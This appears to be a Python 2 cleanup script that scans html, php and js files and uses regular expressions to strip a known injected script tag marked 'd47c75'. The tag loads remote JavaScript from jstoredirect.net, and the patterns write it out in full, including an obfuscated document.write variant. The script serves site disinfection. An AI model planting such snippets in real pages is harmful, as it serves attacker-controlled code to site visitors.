# -*- coding: utf-8 -*-
import re, sys, os, StringIO

filenames = sys.stdin.read()
buf =  StringIO.StringIO(filenames)
filenames = buf.readlines()

for filename in filenames:
    filename = filename.strip()
    fileExtension = filename.split(".")

    fileExtension = fileExtension[len(fileExtension)-1]

    fileExtensions = ['html','php','js']


    if fileExtension not in fileExtensions:
        continue

    rawstr1 = r"""^\<\?$
^#d47c75#$
^echo \"\<script type=\\\"text\/javascript\\\" src=\\\"http:\/\/jstoredirect.net\/qw\/mod.php\?mod=18\\\" name=\\\"qe18\\\"></script>\";$
^#/d47c75#$
^\?\>$"""
    rawstr2 = r"""\<!--d47c75--\>\<script type=\"text/javascript\" src=\"http://jstoredirect.net/qw/mod.php\?mod=18\" name=\"qe18\"\>\<\/script\>\<\!--\/d47c75--\>"""
    rawstr3 = r"""^\/\*d47c75\*\/$
^document.write\('\<script type=\"text\/ja' \+ 'vascript\" src=\"http:\/\/jstoredirect.net\/qw\/mod.php\?mod=18\" name=\"qw18\"\>\<\/s\' \+ \'cript\>\'\)\;$
^\/\*\/d47c75\*\/$"""

    stringlist=[rawstr1,rawstr2,rawstr3]

    for rawstr in stringlist:
        myFileStr = open(filename,'r').read()

        # method 1: using a compile object
        compile_obj = re.compile(rawstr,  re.MULTILINE)
        match = compile_obj.search(myFileStr)
        # Replace string
        if match:
            os.rename(filename,filename+".eraditmp")
            newstr = compile_obj.subn("", myFileStr)
            finalfile = open(filename,'w')
            finalfile.write(newstr[0])
            os.remove(filename+".eraditmp")
    

